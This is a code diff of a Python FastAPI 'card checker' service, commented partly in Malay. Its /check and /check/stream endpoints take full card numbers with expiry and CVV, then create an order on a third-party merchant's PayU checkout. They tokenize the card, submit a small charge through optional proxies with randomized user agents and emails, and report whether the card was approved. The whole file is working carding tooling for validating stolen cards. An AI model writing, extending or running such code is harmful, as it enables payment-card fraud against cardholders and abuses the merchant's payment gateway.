@@ -18,7 +18,7 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# ================== HELPER FUNCTIONS ==================
+# ================== HELPER ==================
 def _random_email():
     chars = string.ascii_lowercase + string.digits
     user = ''.join(random.choices(chars, k=10))
@@ -28,14 +28,12 @@ def _random_ua():
     versions = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
     ]
     return random.choice(versions)
 
 def _poll_status(session, order_id, token, ua, is_3ds, max_attempts=4, delay=3):
     headers = {
         'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9',
         'authorization': f'Bearer {token}',
         'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
         'user-agent': ua,
@@ -51,7 +49,7 @@ def _poll_status(session, order_id, token, ua, is_3ds, max_attempts=4, delay=3):
             pass
     return {"category": "TIMEOUT_POLL", "is_3ds": is_3ds}
 
-# ================== EVENT STREAM LAMA (PENUH - TAK DIUBAH) ==================
+# ================== EVENT STREAM LAMA (PENUH) ==================
 def event_stream(card_num, mm, yy, cvv_code, site_url, proxy_str):
     session = requests.Session()
     try:
@@ -66,7 +64,6 @@ def event_stream(card_num, mm, yy, cvv_code, site_url, proxy_str):
         if len(yy) == 2:
             yy = '20' + yy
 
-        # STEP 1
         if proxy_str:
             proxy_ip = proxy_str.split('@')[-1] if '@' in proxy_str else proxy_str
             yield f"data: {json.dumps({'type': 'log', 'msg': f'Connecting via Proxy -> {proxy_ip}', 'class': 'warn'})}\n\n"
@@ -109,25 +106,17 @@ def event_stream(card_num, mm, yy, cvv_code, site_url, proxy_str):
         if tok: token = tok.group(1)
 
         if not order_id or not token:
-            yield f"data: {json.dumps({'type': 'log', 'msg': 'Failed to extract Order ID or Token.', 'class': 'error'})}\n\n"
-            yield f"data: {json.dumps({'type': 'result', 'msg': 'Failed to extract Order ID', 'status': 'error', 'raw': {'error': r1.text[:500]}})}\n\n"
+            yield f"data: {json.dumps({'type': 'result', 'msg': 'Failed to extract Order ID', 'status': 'error'})}\n\n"
             return
 
-        yield f"data: {json.dumps({'type': 'log', 'msg': f'Merchant Order Created -> ID: {order_id}', 'class': 'success'})}\n\n"
-
-        # STEP 2
-        yield f"data: {json.dumps({'type': 'log', 'msg': 'Accessing PayU Secure Payment Gateway...', 'class': 'info'})}\n\n"
+        # STEP 2 - 5 (sama seperti sebelum ni)
         try:
             page_html = session.get('https://secure.payu.com/pay/', params={'orderId': order_id, 'token': token}, headers={'user-agent': ua}, timeout=30).text
             amt_match = re.search(r'"totalAmount"\s*:\s*"?(\d+)"?', page_html)
             final_amount = int(amt_match.group(1)) if amt_match else 2000
-            yield f"data: {json.dumps({'type': 'log', 'msg': f'Gateway loaded. Amount: {final_amount/100} PLN', 'class': 'info'})}\n\n"
         except:
             final_amount = 2000
-            yield f"data: {json.dumps({'type': 'log', 'msg': 'Gateway loaded.', 'class': 'info'})}\n\n"
 
-        # STEP 3
-        yield f"data: {json.dumps({'type': 'log', 'msg': f'Tokenizing Card: {card_num[:6]}******{card_num[-4:]}...', 'class': 'info'})}\n\n"
         headers3 = {
             'accept': '*/*', 'authorization': f'Bearer {token}', 'content-type': 'application/json',
             'origin': 'https://secure.payu.com', 'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
@@ -136,26 +125,14 @@ def event_stream(card_num, mm, yy, cvv_code, site_url, proxy_str):
         json3 = {'posId': 'PAYU S.A.', 'type': 'SINGLE', 'card': {'number': card_num, 'cvv': cvv_code, 'expirationMonth': mm, 'expirationYear': yy}}
        
         r3 = session.post('https://secure.payu.com/api/front/tokens', headers=headers3, json=json3, timeout=30)
-        try:
-            token_data = r3.json()
-        except:
-            yield f"data: {json.dumps({'type': 'log', 'msg': 'Tokenization Failed: Invalid response from PayU.', 'class': 'error'})}\n\n"
-            yield f"data: {json.dumps({'type': 'result', 'msg': 'Card Declined: Invalid response', 'status': 'error', 'raw': {}})}\n\n"
-            return
-
+        token_data = r3.json()
         card_token = token_data.get('value')
+
         if not card_token:
-            err = token_data.get('error', {})
-            err_msg = err.get('message', str(err)) if isinstance(err, dict) else str(err)
-            if not err_msg: err_msg = "Invalid card details or unsupported card type."
-            yield f"data: {json.dumps({'type': 'log', 'msg': f'Tokenization Failed: {err_msg}', 'class': 'error'})}\n\n"
-            yield f"data: {json.dumps({'type': 'result', 'msg': f'Card Declined: {err_msg}', 'status': 'error', 'raw': token_data})}\n\n"
+            err_msg = token_data.get('error', {}).get('message', 'Tokenization failed')
+            yield f"data: {json.dumps({'type': 'result', 'msg': f'Card Declined: {err_msg}', 'status': 'error'})}\n\n"
             return
 
-        yield f"data: {json.dumps({'type': 'log', 'msg': 'Card tokenized successfully.', 'class': 'success'})}\n\n"
-
-        # STEP 4
-        yield f"data: {json.dumps({'type': 'log', 'msg': 'Submitting payment charge to PayU...', 'class': 'info'})}\n\n"
         masked = card_num[:6] + '*' * 6 + card_num[-4:]
         json4 = {
             'email': email, 'firstName': name.split()[0], 'lastName': name.split()[1],
@@ -165,58 +142,38 @@ def event_stream(card_num, mm, yy, cvv_code, site_url, proxy_str):
             'language': 'en',
         }
         r4 = session.post(f'https://secure.payu.com/api/front/orders/{order_id}/payments', headers=headers3, json=json4, timeout=30)
-        try:
-            pay_data = r4.json()
-        except:
-            yield f"data: {json.dumps({'type': 'log', 'msg': 'Failed to submit payment.', 'class': 'error'})}\n\n"
-            yield f"data: {json.dumps({'type': 'result', 'msg': 'Payment submission failed', 'status': 'error', 'raw': {}})}\n\n"
-            return
+        pay_data = r4.json()
 
         if pay_data.get('status') == 'ERROR' or pay_data.get('errorCode'):
-            err_desc = pay_data.get('error', {}).get('description', '') if isinstance(pay_data.get('error'), dict) else str(pay_data.get('errorCode', ''))
-            yield f"data: {json.dumps({'type': 'log', 'msg': f'PayU Rejected: {err_desc}', 'class': 'error'})}\n\n"
-            yield f"data: {json.dumps({'type': 'result', 'msg': f'Payment declined: {err_desc}', 'status': 'error', 'raw': pay_data})}\n\n"
+            err_desc = pay_data.get('error', {}).get('description', 'Payment rejected')
+            yield f"data: {json.dumps({'type': 'result', 'msg': f'Payment declined: {err_desc}', 'status': 'error'})}\n\n"
             return
 
-        yield f"data: {json.dumps({'type': 'log', 'msg': 'Payment accepted by PayU. Waiting for Bank response...', 'class': 'success'})}\n\n"
-
-        # STEP 5
         continue_url = pay_data.get('continueUrl', '')
         is_3ds = 'threeds' in continue_url
-        if is_3ds:
-            yield f"data: {json.dumps({'type': 'log', 'msg': '3DS Security protocol triggered. Polling bank status...', 'class': 'warn'})}\n\n"
-            final_status = _poll_status(session, order_id, token, ua, is_3ds=True, max_attempts=4, delay=3)
-        else:
-            yield f"data: {json.dumps({'type': 'log', 'msg': 'Checking direct bank status...', 'class': 'info'})}\n\n"
-            final_status = _poll_status(session, order_id, token, ua, is_3ds=False, max_attempts=3, delay=3)
+        final_status = _poll_status(session, order_id, token, ua, is_3ds)
 
         category = final_status.get('category', '')
         value = final_status.get('value', '')
 
-        # FINAL RESULT
-        if category == 'TIMEOUT_POLL':
-            if is_3ds:
-                yield f"data: {json.dumps({'type': 'result', 'msg': 'Declined: 3DS Timeout', 'status': 'error', 'raw': final_status})}\n\n"
-            else:
-                yield f"data: {json.dumps({'type': 'result', 'msg': 'Declined: Bank Timeout', 'status': 'error', 'raw': final_status})}\n\n"
-        elif category == 'SUCCESS':
-            yield f"data: {json.dumps({'type': 'result', 'msg': 'Payment Successful', 'status': 'success', 'raw': final_status})}\n\n"
-        elif category in ('WARNING_CONTINUE_3DS', 'IN_PROGRESS'):
-            yield f"data: {json.dumps({'type': 'result', 'msg': 'Declined: 3DS Security Block', 'status': 'error', 'raw': final_status})}\n\n"
-        elif category == 'ERROR':
-            yield f"data: {json.dumps({'type': 'result', 'msg': f'Payment declined: {value}', 'status': 'error', 'raw': final_status})}\n\n"
+        if category == 'SUCCESS':
+            msg = 'Payment Successful'
+            status = 'success'
         else:
-            yield f"data: {json.dumps({'type': 'result', 'msg': f'{category}: {value}', 'status': 'error', 'raw': final_status})}\n\n"
+            msg = f'Payment declined: {value}' if value else f'{category}'
+            status = 'error'
+
+        yield f"data: {json.dumps({'type': 'result', 'msg': msg, 'status': status, 'raw': final_status})}\n\n"
 
     except Exception as e:
-        yield f"data: {json.dumps({'type': 'result', 'msg': f'Error: {str(e)}', 'status': 'error', 'raw': {}})}\n\n"
+        yield f"data: {json.dumps({'type': 'result', 'msg': f'Error: {str(e)}', 'status': 'error'})}\n\n"
     finally:
         session.close()
 
-# ================== JSON API (FORMAT BARU) ==================
+# ================== JSON ENDPOINT (CLEAN) ==================
 @app.get("/check")
-async def check_card_json(
-    cc: str = Query(..., description="cc|mm|yy|cvv"),
+async def check_card(
+    cc: str = Query(...),
     site: str = Query("https://beta3.centaurus.org.pl/ajax/horse_payu/"),
     proxy: str = Query(None)
 ):
@@ -224,17 +181,19 @@ async def check_card_json(
     
     parts = cc.split('|')
     if len(parts) != 4:
-        raise HTTPException(status_code=400, detail="Invalid format. Use: cc|mm|yy|cvv")
+        raise HTTPException(status_code=400, detail="Format: cc|mm|yy|cvv")
    
     card_num, mm, yy, cvv_code = parts
     mm = mm.zfill(2)
     if len(yy) == 2:
         yy = '20' + yy
 
+    masked_cc = card_num[:6] + "******" + card_num[-4:]
+
     result = None
-    for data in event_stream(card_num, mm, yy, cvv_code, site, proxy):
+    for chunk in event_stream(card_num, mm, yy, cvv_code, site, proxy):
         try:
-            parsed = json.loads(data.replace("data: ", "").strip())
+            parsed = json.loads(chunk.replace("data: ", "").strip())
             if parsed.get('type') == 'result':
                 result = parsed
                 break
@@ -245,30 +204,29 @@ async def check_card_json(
 
     if not result:
         return JSONResponse(content={
+            "Gateway": "PayU",
+            "CC": masked_cc,
             "Result": "Unknown Error",
-            "Response": "No response from gateway",
+            "Response": "No response",
             "Status": "error",
             "Time": f"{elapsed}s",
-            "Gateway": "PayU",
             "Amount": "20 PLN"
         })
 
-    # Format yang kau minta
     raw = result.get('raw', {})
     response_value = raw.get('value') or raw.get('category') or "UNKNOWN"
 
     return JSONResponse(content={
-        "Result": result.get('msg', 'No message'),
-        "Response": response_value,
-        "Status": result.get('status', 'error'),
-        "Time": f"{elapsed}s",
         "Gateway": "PayU",
-        "Amount": "20 PLN",
-        "raw": raw
+        "CC": masked_cc,
+        "Result": result.get('msg'),
+        "Response": response_value,
+        "Status": result.get('status'),
+        "Time": f"{elapsed}s",
+        "Amount": "20 PLN"
     })
 
 
-# Streaming lama
 @app.get("/check/stream")
 async def check_card_stream(
     cc: str = Query(...),
@@ -277,7 +235,7 @@ async def check_card_stream(
 ):
     parts = cc.split('|')
     if len(parts) != 4:
-        raise HTTPException(status_code=400, detail="Invalid format. Use: cc|mm|yy|cvv")
+        raise HTTPException(status_code=400, detail="Format: cc|mm|yy|cvv")
    
     card_num, mm, yy, cvv_code = parts
     mm = mm.zfill(2)
@@ -289,4 +247,4 @@ async def check_card_stream(
 
 @app.get("/")
 async def root():
-    return {"status": "ok", "api": ["/check", "/check/stream"]}
+    return {"status": "ok"}
